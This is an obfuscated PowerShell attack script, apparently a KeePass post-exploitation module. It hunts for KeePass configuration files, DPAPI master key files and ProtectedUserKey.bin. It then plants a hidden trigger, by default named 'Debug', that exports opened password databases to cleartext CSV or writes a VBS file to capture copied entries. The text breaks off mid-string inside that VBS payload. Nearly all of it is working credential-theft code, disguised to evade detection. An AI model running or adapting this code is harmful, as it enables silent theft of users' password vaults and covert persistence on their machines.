 SET-ItEM  ("V"+"a"+"RIa"+"bLE"+":iG1YVJ")  ([TyPe]("{0}{2}{1}"-F 'SysteM','gUID','.')); 

function F`In`d-k`EePasSco`NfIg {


    [CmdletBinding()]
    param(
        [Parameter(pOsItiOn = 0, valuEFROmpiPELine = ${T`RuE}, vaLuefROmpiPELINEBYPropertynAME = ${Tr`UE})]
        [ValidateScript({&("{2}{0}{1}" -f'est-Pat','h','T') -Path ${_} })]
        [Alias({"{0}{2}{1}" -f'F','lName','ul'})]
        [String[]]
        ${pa`Th}
    )

    BEGIN {

        function l`oCAl:G`eT-I`Ni`C`onTeNt {
        
            [CmdletBinding()]
            Param(
                [Parameter(MAnDAtoRy=${tr`UE}, VAluEfroMPipeLINe=${tR`Ue}, vaLUEFrOmPIPElinEByPROpertynAme=${t`RuE})]
                [Alias({"{2}{0}{1}" -f'ull','Name','F'})]
                [ValidateScript({ &("{2}{0}{1}" -f 'Pa','th','Test-') -Path ${_} })]
                [String[]]
                ${Pa`TH}
            )

            PROCESS {
                ForEach(${TaRGETP`A`TH} in ${p`Ath}) {
                    ${I`Ni`OBJect} = @{}
                    Switch -Regex -File ${tAr`GEt`pa`TH} {
                        ((("{0}{1}{2}{3}"-f'^LtT[(','.+)L','t','T]'))."rePLa`ce"(([CHaR]76+[CHaR]116+[CHaR]84),'\')) 
                        {
                            ${SECt`I`on} = ${maT`C`HES}[1].("{0}{1}" -f'Tr','im').Invoke()
                            ${INI`Obj`E`ct}[${se`CT`IOn}] = @{}
                            ${c`oM`MenTCOUnt} = 0
                        }
                        "^(;.*)$" 
                        {
                            ${v`A`lUE} = ${Ma`TC`hEs}[1].("{1}{0}"-f 'm','Tri').Invoke()
                            ${c`om`mEn`T`COUNT} = ${coMmEn`Tco`UNT} + 1
                            ${N`Ame} = ("{0}{2}{1}" -f 'Com','t','men') + ${Co`m`mENt`c`OUnt}
                            ${I`NiOb`JECt}[${sE`cT`IoN}][${n`Ame}] = ${V`A`LUe}
                        }
                        ((("{3}{1}{2}{0}{4}" -f '}s*=(.*','?){','0','(.+',')'))-f[ChAr]92) 
                        {
                            ${NA`ME}, ${VAl`UE} = ${MatCh`ES}[1..2]
                            ${NA`ME} = ${N`Ame}.("{1}{0}" -f 'm','Tri').Invoke()
                            ${val`Ues} = ${V`A`lUE}.("{0}{1}" -f'sp','lit').Invoke(',') | &("{2}{0}{1}"-f'ch-O','bject','ForEa') {${_}.("{0}{1}"-f'Tri','m').Invoke()}
                            if(${VaL`UES} -isnot [System.Array]) {${Va`luES} = @(${Va`lU`Es})}
                            ${In`iob`JEct}[${s`E`ctIon}][${Na`mE}] = ${valU`es}
                        }
                    }
                    ${INIo`B`jECT}
                }
            }
        }

        function LOCA`l:`gE`T-`Ke`EPASsINi`Fi`eldS {
            
            [CmdletBinding()]
            Param (
                [Parameter(MANdATory=${T`RuE})]
                [ValidateScript({ &("{1}{2}{0}" -f 'th','Test-P','a') -Path ${_} })]
                [String]
                ${PA`Th}
            )

            ${K`eEpas`S`InIPath} = &("{0}{3}{1}{2}" -f'Resolve','Pat','h','-') -Path ${P`AtH}
            ${KEEp`A`sSI`NIpat`HPA`ReNT} = ${Ke`epaSsinI`Path} | &("{0}{3}{2}{1}" -f'Sp','th','t-Pa','li') -Parent
            ${KEe`PaSsI`NI} = &("{1}{4}{0}{2}{3}" -f'te','Get-In','n','t','iCon') -Path ${KE`E`passi`NIPaTh}
            ${reCEN`TlYuS`Ed} = @()

            try {
                if(${kEe`paSsi`NI}."K`Ee`PasS"."Keel`As`TdB") {
                    ${Las`Tus`EDf`ile} = &("{3}{1}{0}{2}" -f'lve','eso','-Path','R') -Path "$KeePassINIPathParent\$($KeePassINI.KeePass.KeeLastDb)" -ErrorAction ("{1}{0}" -f'top','S')
                }
            }
            catch {}

            try {
                if(${k`EE`PaSSIni}."kEepA`SS"."kEEKeyS`o`U`RCeID0") {
                    ${DEF`Au`LtDATa`BASEPATh} = &("{0}{1}{3}{2}" -f'Resolve','-','h','Pat') -Path ${KEepaSS`I`NI}."k`Eepa`sS"."K`eE`keys`ource`id0" -ErrorAction ("{4}{3}{1}{2}{0}"-f 'tinue','ntlyCo','n','e','Sil')
                }
            }
            catch {}

            try {
                if(${KEePaS`s`iNI}."k`eePasS"."KEeKe`y`So`UR`Cev`ALUE0") {
                    ${dEfaUltK`EYFI`lEp`ATH} = &("{2}{1}{0}"-f'h','at','Resolve-P') -Path ${KeePaS`SI`NI}."k`EE`Pass"."keeK`EYSo`UrCEv`A`LUe0" -ErrorAction ("{2}{0}{1}{3}" -f 'l','yC','Silent','ontinue')
                }
            }
            catch {}

            
            ${KeE`PAssI`Ni}."k`EEPa`SS"."K`EYS" | &("{2}{1}{0}{3}" -f 're-Obj','e','Wh','ect') {${_} -match ("{0}{2}{3}{1}{4}" -f'Ke','rc','eKeySo','u','eID[1-9]+')} | &("{0}{3}{1}{2}{4}" -f'F','h-Obje','c','oreac','t') {
                try {
                    ${I`D} = ${_}[-1]
                    ${REceNT`l`Y`Us`ED} += ${kEEP`As`S`InI}."kEep`A`sS"["KeeKeySourceID${ID}"]
                    ${recE`N`TlyU`Sed} += ${k`e`ePASSiNi}."k`E`Epass"["KeeKeySourceValue${ID}"]
                }
                catch{}
            }

            ${kEEPa`S`S`i`NiProPeRtIes} = @{
                ("{0}{2}{4}{1}{3}"-f 'KeePa','f','ssC','igPath','on') = ${KeePa`sSI`N`iPaTh}
                ("{1}{3}{2}{0}"-f'esktop','Sec','eD','ur') = ${Nu`Ll}
                ("{2}{3}{0}{1}"-f'd','File','Las','tUse') = ${l`AsTU`S`EDfiLE}
                ("{0}{3}{1}{2}" -f'R','lyUse','d','ecent') = ${R`eC`En`TLyuSEd}
                ("{4}{0}{2}{1}{3}"-f'f','ataba','aultD','sePath','De') = ${d`EFa`U`LTD`A`TabaSE`pATh}
                ("{1}{2}{3}{0}"-f 'Path','DefaultKe','yF','ile') = ${D`e`FA`UltkEY`FIl`epaTh}
                ("{1}{0}{5}{4}{2}{3}" -f'ef','D','ltUse','rAccountData','u','a') = ${N`ULl}
            }
            ${KeeP`A`Ss`inIInFo} = &("{0}{3}{2}{1}"-f 'New-O','t','ec','bj') -TypeName ("{1}{0}{2}" -f'S','P','Object') -Property ${keEpA`ssInIproP`eRt`I`eS}
            ${KEe`p`AS`siNI`inFo}."pSO`BjE`CT"."TYPE`NaMes".("{0}{1}"-f'In','sert').Invoke(0, ("{3}{2}{1}{0}" -f 'ig','onf','ass.C','KeeP'))
            ${K`e`EpAsSiNI`iN`FO}
        }

        function LOc`AL:Get-keePaS`S`Xmlfi`eLDS {
            
            [CmdletBinding()]
            Param (
                [Parameter(mANDAtoRy=${tR`Ue})]
                [ValidateScript({ &("{3}{2}{1}{0}" -f 'th','t-Pa','s','Te') -Path ${_} })]
                [String]
                ${pA`TH}
            )

            ${KeEpAS`S`xm`lP`AtH} = &("{0}{1}{2}"-f 'Resolve','-Pa','th') -Path ${P`ATh}
            ${keEpaS`Sxm`LP`AThp`Ar`ent} = ${K`eEpassXMLp`Ath} | &("{1}{0}{2}" -f 'p','S','lit-Path') -Parent
            [Xml]${KE`EPAS`SxmL} = &("{3}{2}{0}{1}" -f'-Conten','t','t','Ge') -Path ${Ke`EPasSXml`p`AtH}

            ${L`As`TUseDFi`LE} = ''
            ${rEcen`T`LY`UseD} = @()
            ${d`Ef`AuLtdatAb`AsE`p`ATh} = ''
            ${De`FAUL`TkeyfIlEP`AtH} = ''
            ${deFaU`l`TuSe`RaCCo`UNtd`ATa} = ${n`UlL}

            if(${KE`ePA`sSX`mL}."Co`NFigu`RA`Ti`on"."APp`LicA`Tion"."La`sTusEDfi`LE") {
                ${L`As`TUsed`FILE} = &("{2}{0}{3}{1}"-f 's','lve-Path','Re','o') -Path "$KeePassXMLPathParent\$($KeePassXML.Configuration.Application.LastUsedFile.Path)" -ErrorAction ("{0}{1}{4}{3}{2}" -f'Sile','ntlyCo','e','inu','nt')
            }

            if(${kE`EpASsx`ml}."cO`NfIgu`Ra`TIoN"."a`pp`LI`cAtiON"."MostR`E`Ce`NTl`YuseD"."iTe`ms") {
                ${Keep`A`ss`xML}."Co`Nf`iGUrATI`ON"."ApP`lIc`A`TION"."MOsTRE`CENt`ly`Us`ed"."I`TEMs" | &("{3}{4}{2}{0}{1}"-f 'ach-O','bject','e','F','or') {
                    &("{1}{2}{0}{3}"-f'e-Pat','Resol','v','h') -Path "$KeePassXMLPathParent\$($_.ConnectionInfo.Path)" -ErrorAction ("{0}{3}{4}{1}{2}"-f 'Sile','ontinu','e','nt','lyC') | &("{1}{0}{2}{3}" -f'oreach','F','-','Object') {
                        ${re`CEnTl`y`USED} += ${_}
                    }
                }
            }

            if(${keEPa`SS`xML}."CON`FiGURATI`ON"."D`Efa`ULTs"."K`EYS`OurC`ES"."ASs`Ocia`T`ioN"."DATAbASEP`A`Th") {
                ${de`Fa`UlT`d`At`AbASEpAtH} = &("{2}{1}{0}" -f 'ath','ve-P','Resol') -Path "$KeePassXMLPathParent\$($KeePassXML.Configuration.Defaults.KeySources.Association.DatabasePath)" -ErrorAction ("{2}{0}{3}{1}" -f'Conti','ue','Silently','n')
            }

            if(${k`ee`P`ASsXmL}."ConF`iGur`AtiON"."dEF`AU`LTS"."kEYSou`R`ces"."asSo`cIaT`ION"."kE`YfI`leP`ATh") {
                ${D`e`FA`Ul`T`keyFILe`PAth} = &("{1}{3}{0}{2}" -f 'e','Resol','-Path','v') -Path "$KeePassXMLPathParent\$($KeePassXML.Configuration.Defaults.KeySources.Association.KeyFilePath)" -ErrorAction ("{3}{0}{1}{2}"-f 'l','yConti','nue','Silent')
            }

            ${DEFAultus`ERA`cc`o`UnT} = ${kEEp`As`S`xML}."con`FI`g`URatioN"."de`F`AulTS"."ke`Ys`OuR`ces"."aS`sOCIa`TIOn"."u`SERACc`Ount" -eq ("{0}{1}"-f 'tr','ue')

            ${s`eCUrED`Eskt`OP} = ${kee`P`ASSXml}."cONFi`GUraT`iON"."s`E`CurITy"."Mas`TerK`E`yONSecU`RedEsKT`op" -eq ("{1}{0}" -f'e','tru')

            if(${DEfaULTUSeR`ACc`O`UnT}) {

                ${u`s`E`RPatH} = ${pa`Th}.("{0}{1}" -f'Sp','lit').Invoke('\')[0..2] -join '\'

                ${uSe`RMaST`er`k`eyF`OLdEr} = &("{3}{2}{1}{0}" -f '-ChildItem','t','e','G') -Path "$UserPath\AppData\Roaming\Microsoft\Protect\" -ErrorAction ("{2}{3}{1}{0}" -f 'ue','ntlyContin','S','ile') | &("{0}{1}{3}{2}"-f'Se','lect','Object','-') -First 1 -ExpandProperty ("{2}{1}{0}" -f 'lName','ul','F')

                if(${uSeRm`ASTe`Rk`e`yf`o`lder}) {

                    ${Us`ERs`iD} = ${UsE`Rm`ASTe`Rke`yFO`LdeR} | &("{2}{1}{3}{0}"-f 'ath','t','Spli','-P') -Leaf

                    try {
                        ${U`SERs`iDObject} = (&("{2}{0}{1}"-f 'w-Objec','t','Ne') ("{7}{2}{5}{6}{10}{8}{3}{1}{0}{4}{9}{11}"-f'curityIdenti','pal.Se','.Se','ci','f','c','ur','System','Prin','i','ity.','er')(${US`ER`sId}))
                        ${U`sErnamE`D`oMAIN} = ${Us`ERsidOb`J`e`ct}."TRAn`SlatE"([System.Security.Principal.NTAccount])."vA`LUe"

                        ${u`SeR`DOma`iN}, ${uS`ErN`AmE} = ${UserNa`m`EdoM`Ain}.("{1}{0}"-f't','Spli').Invoke('\')
                    }
                    catch {
                        &("{1}{3}{0}{2}"-f'-','Wr','Warning','ite') ('U'+'nable '+'t'+'o '+'tra'+'nsl'+'ate '+'SID'+' '+'fr'+'om '+"$UserMasterKeyFolder "+', '+'d'+'ef'+'au'+'lting '+'t'+'o '+'use'+'r '+'n'+'ame')
                        ${US`erN`Ame} = ${usErP`A`Th}.("{1}{0}"-f 'plit','S').Invoke('\')[-1]
                        ${uSe`RD`oMAIN} = ${n`ULL}
                    }

                    ${u`seRMastE`RK`EyFileS} = @(, $(&("{3}{2}{1}{0}" -f 'dItem','il','h','Get-C') -Path ${us`ermaste`Rk`eyF`OLDeR} -Force | &("{2}{1}{0}" -f 't','ct-Objec','Sele') -ExpandProperty ("{0}{1}" -f 'F','ullName')) )
                }
                else {
                    ${usE`R`siD} = ${N`UlL}
                    ${UsE`R`NaME} = ${Nu`ll}
                    ${U`sE`RdO`MAin} = ${nU`Ll}
                }

                ${USER`KE`eP`ASS`DPA`piBLoB} = &("{2}{0}{1}" -f't-Ite','m','Ge') -Path "$UserPath\AppData\Roaming\KeePass\ProtectedUserKey.bin" -ErrorAction ("{2}{1}{0}"-f 'tinue','yCon','Silentl') | &("{1}{3}{0}{2}"-f 'bj','Selec','ect','t-O') -ExpandProperty ("{1}{2}{0}" -f'lName','Fu','l')

                ${U`seR`mastE`RKe`y`proPERT`IeS} = @{
                    ("{2}{0}{1}" -f'er','Sid','Us') = ${US`ERS`id}
                    ("{1}{0}"-f'rName','Use') = ${uSe`R`NAME}
                    ("{0}{1}{2}{3}" -f 'Us','e','rDom','ain') = ${uSeRD`O`M`AIN}
                    ("{3}{4}{0}{1}{2}" -f 'D','PAPIB','lob','UserKeePas','s') = ${usEr`KeE`PASs`dpaP`IbL`Ob}
                    ("{0}{2}{1}{3}" -f 'U','rMasterKe','se','yFiles') = ${U`s`E`RMaSteRK`eY`FilEs}
                }
                ${de`F`AUL`TUS`e`RACC`OuNTdaTA} = &("{0}{2}{1}"-f'Ne','ect','w-Obj') -TypeName ("{2}{1}{0}" -f'ct','Obje','PS') -Property ${user`mAST`E`R`Ke`Ypro`PE`RtieS}
            }

            ${kEep`AsS`X`ML`prOp`erT`ieS} = @{
                ("{3}{1}{0}{2}" -f'ass','eP','ConfigPath','Ke') = ${KEEpA`SSXm`l`pATh}
                ("{1}{3}{2}{0}" -f 'op','Secu','Deskt','re') = ${SE`Cu`REDeS`KT`op}
                ("{1}{2}{0}{3}"-f 'd','LastU','se','File') = ${L`As`T`UsEDfi`LE}
                ("{2}{0}{1}" -f'centl','yUsed','Re') = ${RE`cENtlY`U`SeD}
                ("{4}{0}{5}{2}{1}{3}"-f'f','ba','ltData','sePath','De','au') = ${D`EfAuLtDa`T`ABA`se`pA`Th}
                ("{3}{2}{1}{0}" -f'lePath','faultKeyFi','e','D') = ${DEfAu`LT`ke`YF`I`lEpATh}
                ("{2}{5}{1}{3}{4}{0}"-f 'Data','l','De','tUserAccoun','t','fau') = ${D`EfA`Ul`T`USERacco`UntDaTa}
            }
            ${kE`epASs`X`MlINFO} = &("{0}{1}{2}" -f'New','-Obje','ct') -TypeName ("{2}{0}{1}" -f'SObj','ect','P') -Property ${kEE`Pa`sSXM`lpROpErTIEs}
            ${k`eEpaSS`X`m`linfo}."PSO`BJeCT"."t`YPen`AMES".("{1}{0}" -f 'ert','Ins').Invoke(0, ("{0}{4}{3}{1}{2}"-f 'Ke','.Confi','g','ss','ePa'))
            ${KEE`PA`Ssx`mLinFO}
        }
    }

    PROCESS {
        if(${ps`B`OUn`Dp`ArAMetERS}[("{0}{1}"-f'P','ath')]) {
            ${xm`l`FIL`EPAtHS} = ${PA`TH}
        }
        else {
            
            ${x`ml`FiLePAt`hs} = @("$($Env:WinDir | Split-Path -Qualifier)\Users\ ")
            ${xMlFiLep`A`T`hS} += "${env:ProgramFiles(x86)}\"
            ${xmlfi`lePAT`hS} += "${env:ProgramFiles}\"
        }

        ${xm`lFI`LEPat`Hs} | &("{0}{1}{3}{2}"-f 'Fore','ach','Object','-') { &("{1}{2}{0}" -f'Item','G','et-Child') -Path ${_} -Recurse -Include @(("{1}{3}{5}{2}{4}{0}" -f '.xml','KeePa','.c','s','onfig','s'), ("{1}{0}{2}" -f '.','KeePass','ini')) -ErrorAction ("{0}{2}{1}" -f 'Silen','ntinue','tlyCo') } | &("{0}{2}{1}" -f'Wh','ct','ere-Obje') { ${_} } | &("{2}{0}{3}{1}"-f 'ea','Object','For','ch-') {
            &("{1}{0}{3}{2}" -f'ite-V','Wr','ose','erb') "Parsing KeePass config file '$($_.Fullname)' "

            if(${_}."eX`Ten`s`iON" -eq ("{1}{0}" -f 'ml','.x')) {
                &("{3}{2}{0}{4}{1}{5}" -f 'Pas','MLFie','et-Kee','G','sX','lds') -Path ${_}."fUll`Na`ME"
            }
            else {
                &("{2}{0}{4}{1}{3}"-f'et-Ke','ass','G','INIFields','eP') -Path ${_}."FULlN`A`me"
            }
        }
    }
}


function GE`T-Ke`E`PASsCon`F`iGtrIGGEr {

    [CmdletBinding()]
    param(
        [Parameter(pOSitioN = 0, MAndAtORy = ${TR`UE}, vALUeFrompiPeLine = ${tR`UE})]
        [Object[]]
        ${p`AtH}
    )
    BEGIN {
        ${ev`Ent`GUiDs} = @{
            ("{3}{6}{1}{5}{4}{2}{0}"-f '7I6A==','uY','h','1M7','JVJ','T/Kmqe','NtU') = ("{2}{3}{0}{1}" -f 'ializ','ed','Applicatio','n init')
            ("{7}{1}{6}{5}{2}{0}{3}{4}" -f't','PMe','fzi6k','q','lw==','xpSBuJx','6c','2') = ("{6}{7}{3}{4}{5}{2}{0}{1}"-f'ed and read','y','tart','cat','io','n s','Appl','i')
            ("{3}{4}{0}{1}{2}" -f'cTr+AOTY/kXGXe','A','==','go','q3q7E') = ("{0}{1}{4}{3}{2}" -f'Ap','pl','t','ation exi','ic')
            ("{1}{2}{6}{4}{3}{0}{5}" -f 'vaeKz','5f8T','B','B','W4QYm5','tApw==','o') = ("{1}{0}{3}{4}{2}"-f ' dat','Opened','le','abase',' fi')
            ("{2}{3}{0}{5}{4}{1}" -f'm/X','VsPoJljHA==','l','cG','+','J8QMei') = ("{0}{5}{2}{3}{1}{4}" -f'Sav','tabase fi',' ','da','le','ing')
            ("{6}{0}{5}{1}{2}{4}{3}"-f'T','mqcXdW6h','Dq','=','bjg=','S','s6j9/ng') = ("{0}{2}{6}{5}{4}{1}{3}"-f 'S','l','av','e','se fi','ba','ed data')
            ("{0}{4}{5}{1}{2}{3}" -f 'jO','eO','x3sS','Q==','r','emqgXSRmjL/Q') = ("{4}{8}{0}{5}{6}{2}{3}{1}{7}"-f 'g data','efor','(','b','Clos','b','ase file ','e saving)','in')
            ("{3}{0}{2}{4}{1}{5}" -f 'QSa','Q=','mT','lPpw5bE/','gZP2MNsl','=') = ("{7}{0}{2}{4}{1}{3}{5}{6}" -f 'losing','le',' databas',' (aft','e fi','er s','aving)','C')
            ("{2}{1}{0}{3}{4}"-f'FiV','T','P35exipU','R','IX78m9W3A==') = ("{5}{3}{1}{0}{2}{4}"-f'd e','ie','ntry data to clipbo','op','ard','C')
            ("{3}{2}{1}{0}{4}" -f'omQ','arGJ','/','jRLUmvLLT/eo78','==') = ("{0}{1}{3}{2}{4}"-f 'Us','er','tate up',' interface s','dated')
            ("{4}{2}{6}{1}{3}{0}{5}"-f'kg=','K5aB8fwve','k','b','R0dZ','=','penQ6') = ("{0}{4}{2}{8}{7}{5}{3}{6}{1}" -f 'Custom ','icked','b','n c','tool','tto','l','r bu','a')
        }

        ${acT`iO`NGU`idS} = @{
            ("{3}{1}{6}{0}{5}{4}{2}"-f 'O','Owcw','w==','2uX4','6y27kx','e7y6','TB') = ("{0}{4}{5}{3}{2}{1}" -f 'E','e / URL','d lin','comman','xe','cute ')
            ("{4}{3}{2}{1}{0}"-f '6g==','swQ','f','mn96US7mbrjyk','tka') = ("{0}{4}{5}{2}{1}{6}{3}"-f'C',' ','gger on/off','te','hang','e tri','sta')
            ("{2}{7}{4}{6}{5}{1}{3}{0}"-f'A==','O+U','/','u','FV1','c','XmPRPqrifL4','U') = ("{1}{3}{2}{0}" -f'le','O','database fi','pen ')
            ("{2}{4}{0}{5}{1}{3}" -f 'E3o5','v','9VdhS','Q==','/hMQV2p','zRDw') = ("{6}{5}{0}{4}{2}{1}{3}" -f'iv','ba','data','se','e ','e act','Sav')
            ("{0}{4}{2}{1}{5}{3}{6}" -f'Iq1','ZtFcd','d4Tu2','r','35B','A','OtTQ==') = ("{8}{10}{0}{1}{6}{5}{3}{9}{4}{7}{2}" -f'n','chro','L',' data','ase w','tive','nize ac','ith a file/UR','S','b','y')
            ("{6}{4}{3}{0}{7}{2}{1}{5}"-f'h','g=','jsv','d','TnLxQEWR','=','gOZ/','8sI9') = ("{7}{8}{2}{4}{5}{1}{6}{0}{3}" -f 'a','ive ','t','base',' into',' act','dat','Imp','or')
            ("{2}{0}{4}{1}{3}"-f 'Rr65NO2','I','D5prW87V','g==','xP5RI') = ("{5}{3}{6}{2}{4}{1}{0}"-f'se','aba','e da',' ','t','Export','activ')
            ("{2}{5}{3}{6}{1}{0}{4}"-f 'KZw','5k','W79','/Sb','==','FnVS','2X+yzuX') = ("{1}{3}{5}{0}{2}{4}"-f 'ive','Cl',' d','o','atabase','se act')
            ("{2}{0}{3}{4}{1}" -f'dYWToeZBWT','g==','P7gzL','bF','kzWJ') = (("{3}{7}{6}{5}{0}{2}{4}{8}{1}" -f 'dat','ab)','abas','Act','e (',' ','vate','i','select t'))
            ("{2}{5}{4}{1}{3}{6}{0}" -f 'Q==','zQqa6z','Oz','N','eS','0+M','XAO6ypa') = ("{1}{0}" -f'it','Wa')
            ("{5}{0}{4}{3}{1}{2}" -f'e','P','Q0bg==','yTsT+yItiXVM','Pc','Cf') = ("{2}{3}{0}{1}" -f'ow message ','box','S','h')
            ("{3}{0}{1}{4}{5}{2}" -f 'cbR5K','p','ww==','QGmlNl','s3NlMOD','P') = ("{5}{1}{3}{6}{4}{2}{7}{0}" -f'e','erform g','y','lobal ','t','P','auto-','p')
            ("{2}{1}{5}{0}{3}{4}"-f 'U7sgaI','/','MXCPrWSTQ','24yTQ','==','W') = ("{4}{6}{1}{5}{7}{2}{3}{0}" -f 'y','form','ed ent','r','P',' auto-type with sel','er','ect')
            ("{1}{3}{2}{0}{4}{5}" -f'yBSJ4','Qug3','PTTu','gX','7NqyDhA=','=') = ("{4}{1}{6}{2}{0}{5}{3}"-f 's by t',' e','rie','g','Show','a','nt')
            ("{4}{1}{2}{5}{3}{0}"-f 'Ng==','SYirPo','bo','Zo','lYGPRZlm','Gp') = ("{4}{0}{3}{2}{6}{5}{1}" -f 'd','lbar button','usto','d c','A','too','m ')
            ("{3}{2}{1}{4}{5}{6}{7}{0}" -f'lIeQ==','yy','1Bom','1m','RLqk','SA','pB+','g') = ("{0}{2}{5}{1}{3}{6}{4}" -f'R','u','em','stom toolbar b','on','ove c','utt')
        }
    }
    PROCESS {

        ForEach(${o`BJecT} in ${PA`TH}) {
            if(${Ob`jE`ct} -is [String]) {
                ${keEpASsxml`PA`Th} = ${ObJ`ecT}
            }
            elseif (${ObjE`ct}."pSOb`je`Ct"."pro`perti`Es"[("{2}{0}{4}{3}{1}" -f 'eePassC','igPath','K','f','on')]) {
                ${k`EEpASSxMLpA`TH} = [String]${ObJE`Ct}."ke`ePas`s`cOnFIg`PA`Th"
            }
            elseif (${o`BjEct}."pSO`BJ`eCt"."p`ROPe`RTIEs"[("{1}{0}" -f 'th','Pa')]) {
                ${KEePa`S`Sx`Mlp`ATH} = [String]${O`B`JeCT}."p`Ath"
            }
            elseif (${oB`JeCT}."P`SOb`jECT"."PRopeR`T`Ies"[("{2}{1}{0}" -f'e','m','FullNa')]) {
                ${keE`p`ASSx`mlPa`TH} = [String]${OB`Ject}."f`ULln`AmE"
            }
            else {
                ${Ke`e`pAsSX`MLPATh} = [String]${O`BJ`ECT}
            }

            if(${K`EEpAs`sXML`pA`TH} -and (${KeePaSsXm`l`pAth} -match (('.EY'+'n.'+'xmlEqZ')."REplA`CE"(([cHar]69+[cHar]89+[cHar]110),'\')."Re`Pl`ACE"(([cHar]69+[cHar]113+[cHar]90),[sTRIng][cHar]36))) -and (&("{2}{1}{0}"-f'th','a','Test-P') -Path ${K`eEPA`SsXm`L`pAth}) ) {
                ${kee`PA`SsXmLP`A`Th} = &("{1}{0}{2}{3}"-f 'e','R','solve-P','ath') -Path ${KeePaS`S`XMlPa`Th}

                ${k`eE`PaSSxMl} = ([xml](&("{1}{0}{2}"-f '-Cont','Get','ent') -Path ${K`E`epaSs`XMLPa`TH}))."i`NNerxML"
                
                ${E`VenT`gui`Ds}."Ke`yS" | &("{0}{1}{2}"-f'Forea','ch-Obj','ect') {
                    ${k`eEP`AsS`XMl} = ${KE`EPa`sSxml}."R`eP`LAcE"(${_}, ${e`Ventg`UIdS}[${_}])
                }

                ${Acti`on`gu`ids}."kE`Ys" | &("{1}{2}{3}{0}"-f'ct','Forea','ch-O','bje') {
                    ${kEe`pAs`sXMl} = ${kEepAS`s`xMl}."re`pl`AcE"(${_}, ${ACTIOng`U`ids}[${_}])
                }
                ${keEp`AS`SxMl} = ${KE`EpA`SsxMl}.("{0}{1}"-f 'Re','place').Invoke(("{0}{2}{1}" -f'TypeG','d','ui'), ("{0}{1}"-f'Na','me'))
                ${k`eEpas`SX`ML} = [xml]${KEE`pa`Ss`XMl}

                ${tri`g`GErs} = ${K`e`ePASsX`Ml}.("{2}{0}{3}{1}" -f'e','tNodes','S','lec').Invoke(("{14}{11}{10}{9}{8}{7}{5}{12}{4}{1}{3}{6}{0}{13}{2}"-f'Tr','ger','ers','Sys','cation/Trig','pp','tem/','A','n/','tio','ra','igu','li','igg','Conf'))
                
                ${T`R`iGGErS} | &("{1}{2}{0}{3}"-f'c','Sele','ct-Obje','t') -Expand ("{1}{0}"-f 'rigger','T') -ErrorAction ("{2}{1}{0}{3}"-f 'Cont','ntly','Sile','inue') | &("{3}{1}{0}{2}" -f'ch-Obj','a','ect','ForE') {
                    ${_}."p`SOB`JECt"."TY`pEnA`mes".("{0}{1}" -f 'I','nsert').Invoke(0, ("{3}{0}{2}{1}{4}"-f'ee','s.Tr','Pas','K','igger'))
                    ${_} | &("{0}{1}{2}"-f 'Add-','Membe','r') ("{1}{2}{0}" -f'property','Not','e') ("{1}{3}{0}{2}{4}" -f 'P','KeePassCo','a','nfig','th') ${kEepA`SsxM`LPa`Th}."Pa`TH"
                    ${_}
                }
            }
        }
    }
}


function aDD`-keepaS`SCoNFIgtR`i`Gg`Er {

    [CmdletBinding()]
    param(
        [Parameter(POsItIOn = 0, mANDaToRY = ${T`RUE}, valUefRoMPipelInE = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [Object[]]
        ${p`Ath},

        [Parameter(POSitiOn = 1)]
        [ValidateSet({"{0}{1}{3}{2}"-f 'E','xpo','Database','rt'}, {"{0}{2}{3}{4}{1}"-f 'ExfilDa','pied','ta','C','o'})]
        [String]
        ${aC`TIoN} = ("{2}{1}{0}"-f'ase','tDatab','Expor'),

        [Parameter(pOsitIon = 2)]
        [ValidateScript({&("{1}{2}{0}"-f 'th','Tes','t-Pa') -Path ${_} })]
        [String]
        ${EXpo`RT`PAtH} = "${Env:APPDATA}\KeePass",

        [Parameter(PositiOn = 3)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${t`RIG`GerNA`me} = ("{0}{1}"-f 'De','bug')
    )
    BEGIN {

        ${eXPO`RTpath`FOl`dER} = &("{1}{0}{2}" -f 'e-','Resolv','Path') -Path ${expo`RT`pATh} -ErrorAction ("{0}{1}" -f 'Sto','p')
        if ((&("{2}{0}{1}" -f 't-','Item','Ge') -Path ${E`X`PortpAth`F`old`Er}) -isnot [System.IO.DirectoryInfo]) {
            throw ("{2}{0}{4}{8}{6}{1}{7}{5}{3}" -f 'r',' be','Expo','ry!','tPath m','o','t',' a direct','us')
        }

        if(${aCtI`On} -eq ("{0}{2}{1}" -f 'Ex','tabase','portDa')) {
            
            ${E`V`EntTriGGerGU`Id} = ("{5}{0}{2}{3}{4}{1}"-f'8TB','aeKztApw==','oW4QY','m5','Bv','5f')

            
            ${a`C`TIONGUId} = ("{1}{3}{0}{4}{2}"-f'65NO','D5prW','g==','87VRr','2xP5RII')

            ${t`RIGgeRX`mL} = [xml] @"
<Trigger>
    <Guid>$([Convert]::ToBase64String([System.GUID]::NewGuid().ToByteArray()))</Guid>
    <Name>$TriggerName</Name>
    <Events>
        <Event>
            <TypeGuid>$EventTriggerGUID</TypeGuid>
            <Parameters>
                <Parameter>0</Parameter>
                <Parameter />
            </Parameters>
        </Event>
    </Events>
    <Conditions />
    <Actions>
        <Action>
            <TypeGuid>$ActionGUID</TypeGuid>
            <Parameters>
                <Parameter>$($ExportPath)\{DB_BASENAME}.csv</Parameter>
                <Parameter>KeePass CSV (1.x)</Parameter>
                <Parameter />
                <Parameter />
            </Parameters>
        </Action>
    </Actions>
</Trigger>
"@
            
            &("{3}{1}{0}{2}"-f'e','ite-V','rbose','Wr') ('KeePa'+'ss'+' '+'XML'+' '+'se'+'t '+'t'+'o '+'expor'+'t '+'d'+'atab'+'as'+'e '+'t'+'o '+"$ExportPath")
        }
        else {
            

            
            ${eVEntT`R`IGG`ErguiD} = ("{2}{0}{1}{3}{4}"-f 'x','ipUTFiVRIX78','P35e','m9W3','A==')

            
            ${a`CtIonGu`ID} = ("{6}{5}{4}{3}{2}{1}{0}" -f'==','7kxw','6y2','6','7y','4OwcwTBOe','2uX')

            ${eX`FI`LVBSl`ocaTi`on} = "$ExportPath\$($TriggerName).vbs"

            
            ${eXF`iLv`Bs} = (('{0}
Set'+' ')-f  [ChAR]34+'o'+'bjAr'+'gs '+'= '+'Wscr'+'ipt.Ar'+'gument'+'s
D'+'im '+'oFS'+' '+': '+'S'+'et '+'oFS'+' '+'= '+('C'+'reate'+'O'+'bje'+'c'+'t({0}Sc'+'ripting.Fi'+'leSys'+'tem'+'Objec'+'t{'+'0})
